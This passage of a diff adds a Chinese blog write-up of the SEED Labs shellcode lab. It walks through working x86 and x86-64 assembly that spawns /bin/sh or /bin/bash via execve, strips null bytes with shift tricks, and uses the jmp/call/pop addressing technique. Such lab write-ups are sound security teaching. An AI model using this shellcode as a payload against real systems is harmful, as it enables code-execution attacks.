xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>首先，将“hxxx”压入ebx，然后再左移24个，就是000h；然后再右移24个，就是h000。然后压入栈。然后压入&#x2F;bas，再压入&#x2F;bin，就是&#x2F;bin&#x2F;bash。</p>
+<h3 id="shellcode-压入变量"><a href="#shellcode-压入变量" class="headerlink" title="shellcode 压入变量"></a>shellcode 压入变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      mov  ebx, &quot;hxxx&quot; </span><br><span class="line">      shl  ebx, 24</span><br><span class="line">      shr  ebx, 24</span><br><span class="line">      push ebx</span><br><span class="line">      push &quot;/bas&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"></span><br><span class="line">      ; Arguments</span><br><span class="line">      mov  edx, &quot;-cxx&quot;</span><br><span class="line">      shl  edx, 16</span><br><span class="line">      shr  edx, 16 </span><br><span class="line">      push edx</span><br><span class="line">      mov  edx, esp  </span><br><span class="line">      </span><br><span class="line">      mov  ecx, &quot;laxx&quot;</span><br><span class="line">      shl  ecx, 16</span><br><span class="line">      shr  ecx, 16</span><br><span class="line">      push ecx</span><br><span class="line">      push &quot;ls -&quot;</span><br><span class="line">      mov  ecx, esp</span><br><span class="line"></span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[3] = 0</span><br><span class="line">      push ecx          ; argv[2] = &quot;ls -la&quot;</span><br><span class="line">      push edx          ; argv[1] = &quot;-c&quot;</span><br><span class="line">      push ebx          ; argv[0] points &quot;/bin/bash&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line">   </span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  edx, edx     ; No env variables </span><br><span class="line"></span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>
+
+<p>先压入“&#x2F;bin&#x2F;bash”，再压入-c。这里也是用左移右移做的；然后压入la，这里也是用左移右移做的；然后直接压入”ls -“，最后就是&#x2F;bin&#x2F;bash，参数-c以及ls -la。</p>
+<h3 id="shellcode-压入环境变量"><a href="#shellcode-压入环境变量" class="headerlink" title="shellcode 压入环境变量"></a>shellcode 压入环境变量</h3><p>根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/wion03/article/details/133896868">这个博客</a>，execve()系统调用的第三个参数是一个指向环境变量数组的指针，它允许我们将环境变量传递给程序。在我们的示例程序中(xor edx,edx)，我们向execve()传递了一个null指针，因此没有向程序传递环境变量。</p>
+<p>其提供的代码是通过写入&#x2F;usr&#x2F;bin&#x2F;env文件做到的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; For environment variable </span><br><span class="line">      xor  eax, eax      </span><br><span class="line">      push eax          ; end of the string</span><br><span class="line">      push &quot;1234&quot;</span><br><span class="line">      push &quot;aaa=&quot;</span><br><span class="line">      mov ebx, esp      ; Get the address of env[0]</span><br><span class="line"> </span><br><span class="line">      xor  eax, eax      </span><br><span class="line">      push eax          ; end of the string</span><br><span class="line">      push &quot;5678&quot;</span><br><span class="line">      push &quot;bbb=&quot;</span><br><span class="line">      mov ecx, esp      ; Get the address of env[1]</span><br><span class="line"> </span><br><span class="line">      mov eax, &quot;###4&quot;</span><br><span class="line">      shr eax, 24       ; Generate 0 </span><br><span class="line">      push eax       </span><br><span class="line">      push &quot;=123&quot;</span><br><span class="line">      push &quot;cccc&quot;</span><br><span class="line">      mov edx, esp      ; Get the address of env[2]</span><br><span class="line"> </span><br><span class="line">      xor eax, eax</span><br><span class="line">      push eax          ; env[3] = 0</span><br><span class="line">      push edx          ; env[2] = address to the &quot;cccc=1234&quot; string</span><br><span class="line">      push ecx          ; env[1] = address to the &quot;bbb=5678&quot; string</span><br><span class="line">      push ebx          ; env[0] = address to the &quot;aaa=1234&quot; string</span><br><span class="line">      mov edx, esp</span><br><span class="line"> </span><br><span class="line">      ; Store the argument string on stack</span><br><span class="line">      xor  eax, eax </span><br><span class="line">      push eax          ; Use 0 to terminate the string</span><br><span class="line">      push &quot;/env&quot;</span><br><span class="line">      push &quot;/bin&quot;</span><br><span class="line">      push &quot;/usr&quot;</span><br><span class="line">      mov  ebx, esp     ; Get the string address</span><br><span class="line"> </span><br><span class="line">      ; Construct the argument array argv[]</span><br><span class="line">      push eax          ; argv[1] = 0</span><br><span class="line">      push ebx          ; argv[0] points &quot;/usr/bin/env&quot;</span><br><span class="line">      mov  ecx, esp     ; Get the address of argv[]</span><br><span class="line"> </span><br><span class="line">      ; Invoke execve()</span><br><span class="line">      xor  eax, eax     ; eax = 0x00000000</span><br><span class="line">      mov   al, 0x0b    ; eax = 0x0000000b</span><br><span class="line">      int 0x80</span><br></pre></td></tr></table></figure>
+
+
+<p>原理与之前一致。</p>
+<h2 id="2-运用代码段"><a href="#2-运用代码段" class="headerlink" title="2. 运用代码段"></a>2. 运用代码段</h2><blockquote>
+<p>在Task1中，解决获取数据地址问题的方式是每次构造完数据结构后，动态获取当前的栈顶地址，这样就能获取目标数据的地址。</p>
+</blockquote>
+<blockquote>
+<p>还有另一种方法可以解决同样的问题，即获取所有必要数据结构的地址。在这种方法中，数据存储在代码区中，其地址通过函数调用机制获取。让我们看看下面的代码。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">	BITS 32</span><br><span class="line">	jmp short two</span><br><span class="line">    one:</span><br><span class="line"> 	pop ebx</span><br><span class="line"> 	xor eax, eax</span><br><span class="line"> 	mov [ebx+7], al</span><br><span class="line"> 	mov [ebx+8], ebx </span><br><span class="line"> 	mov [ebx+12], eax</span><br><span class="line"> 	lea ecx, [ebx+8] </span><br><span class="line"> 	xor edx, edx</span><br><span class="line"> 	mov al,  0x0b</span><br><span class="line"> 	int 0x80</span><br><span class="line">     two:</span><br><span class="line"> 	call one</span><br><span class="line"> 	db &#x27;/bin/sh*AAAABBBB&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>section .text定义代码段</p>
+<p>global _start定义程序入口点</p>
+<p>_start:程序入口点</p>
+<p>BITS 32指定程序为32位</p>
+<p>在程序运行时，首先跳转到two。然后，two会call one。此时，运用了call指令。它在跳到目的地址前，会将下一条指令地址保存为返回地址。故，当函数return时，会直接返回到call指令后的一条指令。</p>
+<p>在这个记录中，call后面是一个字符串，而不是一条指令。call会将这个字符串的地址压栈。（压到返回地址的栈地址里头）当“进入函数”时，或者说，call 地址one的时候，栈顶就是储存的返回地址。所以，pop ebx指令就是获取db ‘&#x2F;bin&#x2F;sh*AAAABBBB’这个字符串的地址，然后存到ebx里头。这样就获取了这个字符串的地址。</p>
+<p>然后需要构造这个字符串。首先，xor eax, eax挪出我们需要的0。mov [ebx+7], al这句话，替换了字符串里的<em>，把</em>变为了0。然后，把命令”&#x2F;bin&#x2F;sh00”的地址给了占位符AAAA。然后，mov [ebx+12], eax将ebx+12，即把BBBB赋值为0。lea ecx, [ebx+8]，即为把命令”&#x2F;bin&#x2F;sh00”的地址给ecx。然后，xor edx, edx置空edx，不设环境变量，最后mov al,  0x0b调用execve，int 0x80调用中断。</p>
+<h3 id="改造它，让它可以执行-usr-bin-env-a-11-b-12"><a href="#改造它，让它可以执行-usr-bin-env-a-11-b-12" class="headerlink" title="改造它，让它可以执行&#x2F;usr&#x2F;bin&#x2F;env a&#x3D;11 b&#x3D;12"></a>改造它，让它可以执行&#x2F;usr&#x2F;bin&#x2F;env a&#x3D;11 b&#x3D;12</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">	BITS 32</span><br><span class="line">	jmp short two</span><br><span class="line">    one:</span><br><span class="line"> 	pop ebx</span><br><span class="line"> 	xor eax, eax</span><br><span class="line"> 	</span><br><span class="line"> 	mov [ebx+12], al</span><br><span class="line"> 	mov [ebx+21], al </span><br><span class="line"> 	mov [ebx+26], al</span><br><span class="line"> 	mov [ebx+31], al</span><br><span class="line"> 	</span><br><span class="line"> 	mov [ebx+17], eax</span><br><span class="line"> 	mov [ebx+32], eax</span><br><span class="line"> 	</span><br><span class="line"> 	mov [ebx+13], ebx</span><br><span class="line"> 	</span><br><span class="line"> 	lea edx, [ebx+32] ; env[2]</span><br><span class="line"> 	push edx</span><br><span class="line"> 	lea edx, [ebx+22] ; env[1]</span><br><span class="line"> 	push edx</span><br><span class="line"> 	lea edx, [ebx+27] ; env[0]</span><br><span class="line"> 	push edx</span><br><span class="line"> 	mov edx, esp</span><br><span class="line"> 	</span><br><span class="line"> 	xor ecx, ecx</span><br><span class="line"> 	push ecx         ; argv [1]</span><br><span class="line"> 	lea ecx, [ebx+13]</span><br><span class="line"> 	push ecx</span><br><span class="line"> 	mov ecx, esp     ; argv [0]</span><br><span class="line"> 	</span><br><span class="line"> 	xor eax, eax</span><br><span class="line"> 	mov al, 0x0b</span><br><span class="line"> 	int 0x80</span><br><span class="line"> 	</span><br><span class="line">     two:</span><br><span class="line"> 	call one</span><br><span class="line"> 	db &#x27;/usr/bin/env#BBBBCCCC#a=11#b=22#AAAA&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>原理如上。首先，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov [ebx+12], al</span><br><span class="line">mov [ebx+21], al </span><br><span class="line">mov [ebx+26], al</span><br><span class="line">mov [ebx+31], al</span><br></pre></td></tr></table></figure>
+<p>之后，字符串变为’&#x2F;usr&#x2F;bin&#x2F;env0BBBBCCCC0a&#x3D;110b&#x3D;220AAAA’ </p>
+<p>然后，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov [ebx+17], eax</span><br><span class="line">mov [ebx+32], eax</span><br></pre></td></tr></table></figure>
+<p>之后，字符串变为’&#x2F;usr&#x2F;bin&#x2F;env0000000000a&#x3D;110b&#x3D;2200000’ </p>
+<p>然后，设置命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [ebx+13], ebx</span><br></pre></td></tr></table></figure>
+<p>之后，ebx+13的位置变为’&#x2F;usr&#x2F;bin&#x2F;env’。</p>
+<p>然后，设置环境变量（edx）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea edx, [ebx+32] ; env[2]</span><br><span class="line">push edx</span><br><span class="line">lea edx, [ebx+22] ; env[1]</span><br><span class="line">push edx</span><br><span class="line">lea edx, [ebx+27] ; env[0]</span><br><span class="line">push edx</span><br><span class="line">mov edx, esp</span><br></pre></td></tr></table></figure>
+<p>这就是压三个环境变量。分别压了a&#x3D;11,b&#x3D;22和0。</p>
+<p>然后，设置参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx</span><br><span class="line">push ecx         ; argv [1]</span><br><span class="line">lea ecx, [ebx+13]</span><br><span class="line">push ecx</span><br><span class="line">mov ecx, esp     ; argv [0]</span><br></pre></td></tr></table></figure>
+<p>首先，execve的argv[1]设为0。然后，argv[0]设为’&#x2F;usr&#x2F;env&#x2F;bin’。这句是通过把ebx+13的指向的内容地址（&#x2F;usr&#x2F;env&#x2F;bin）传给ecx，然后把ecx压入栈实现的。</p>
+<p>最后调用execve和中断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov al, 0x0b</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-64位shellcode"><a href="#3-64位shellcode" class="headerlink" title="3. 64位shellcode"></a>3. 64位shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; The following code calls execve(&quot;/bin/sh&quot;, ...)</span><br><span class="line">      xor  rdx, rdx       ; 3rd argument</span><br><span class="line">      push rdx</span><br><span class="line">      mov rax,&#x27;h*******&#x27;</span><br><span class="line">      shl rax,56</span><br><span class="line">      shr rax,56</span><br><span class="line">      push rax</span><br><span class="line">      mov rax,&#x27;/bin/bas&#x27;</span><br><span class="line">      push rax</span><br><span class="line">      mov rdi, rsp        ; 1st argument</span><br><span class="line">      push rdx </span><br><span class="line">      push rdi</span><br><span class="line">      mov rsi, rsp        ; 2nd argument</span><br><span class="line">      xor  rax, rax</span><br><span class="line">      mov al, 0x3b        ; execve()</span><br><span class="line">      syscall</span><br></pre></td></tr></table></figure>
+
+<p>左右移去0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rax,&#x27;h*******&#x27;</span><br><span class="line">shl rax,56</span><br><span class="line">shr rax,56</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
+
+<p>编译运行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 mysh_64.s -o mysh_64.o</span><br><span class="line">ld mysh_64.o -o mysh_64</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在x86-64 CPU上的Linux操作系统中，要使用系统调用，需要使用汇编语言代码。在64位x86_64 Linux系统中，可用的系统调用定义在 &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_64.h 头文件中。每个系统调用都对应一个编号以及若干个参数。如果想使用汇编语言调用系统调用，那么在调用之前，需要将系统调用编号存到 %rax ，将参数依次存到 %rdi, %rsi, %rdx, %r10, %r8, %r9 中，然后再执行 syscall 指令即可。</p>
+</blockquote>
+<blockquote>
+<p>int 0x80 是一种旧的系统调用方式，它是通过中断&#x2F;异常实现的。在执行 int 0x80 指令时，会发生 trap。硬件找到在中断描述符表中的表项，在自动切换到内核栈 (tss.ss0 : tss.esp0) 后根据中断描述符的 segment selector 在 GDT 中找到相应的段描述符，并将其加载到 CS 寄存器中。然后执行相应的中断处理程序。int 0x80 的缺点是它需要进行两次模式切换：从用户态切换到内核态，再从内核态切换回用户态。这种模式切换会带来一定的开销。</p>
+</blockquote>
+<blockquote>
+<p>syscall 指令是一种新的系统调用方式，它是通过陷阱门实现的。syscall 指令会将当前进程从用户态切换到内核态，并跳转到内核中指定的地址处执行相应的系统调用处理程序。与 int 0x80 相比，syscall 指令只需要进行一次模式切换，因此效率更高。</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SEED-Labs-SHELLCODE"><span class="toc-number">1.</span> <span class="toc-text">SEED-Labs SHELLCODE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFShellcode"><span class="toc-number">1.1.</span> <span class="toc-text">什么是Shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%BC%96%E5%86%99shellcode"><span class="toc-number">1.2.</span> <span class="toc-text">1. 编写shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A4%BA%E4%BE%8Bshellcode"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看示例shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91shellcode"><span class="toc-number">1.2.2.</span> <span class="toc-text">编译shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">获取机器码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%88%A0%E9%99%A40"><span class="toc-number">1.2.4.</span> <span class="toc-text">shellcode 删除0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%88%A0%E9%99%A40-1"><span class="toc-number">1.2.5.</span> <span class="toc-text">shellcode 删除0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%8E%8B%E5%85%A5%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.6.</span> <span class="toc-text">shellcode 压入变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-%E5%8E%8B%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.7.</span> <span class="toc-text">shellcode 压入环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%BF%90%E7%94%A8%E4%BB%A3%E7%A0%81%E6%AE%B5"><span class="toc-number">1.3.</span> <span class="toc-text">2. 运用代码段</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E9%80%A0%E5%AE%83%EF%BC%8C%E8%AE%A9%E5%AE%83%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C-usr-bin-env-a-11-b-12"><span class="toc-number">1.3.1.</span> <span class="toc-text">改造它，让它可以执行&#x2F;usr&#x2F;bin&#x2F;env a&#x3D;11 b&#x3D;12</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-64%E4%BD%8Dshellcode"><span class="toc-number">1.4.</span> <span class="toc-text">3. 64位shellcode</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&text=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&is_video=false&description=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN第一点二步_seedlabs_shellcode&body=Check out this article: http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&title=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&name=PWN第一点二步_seedlabs_shellcode&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E7%82%B9%E4%BA%8C%E6%AD%A5-seedlabs-shellcode/&t=PWN第一点二步_seedlabs_shellcode"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
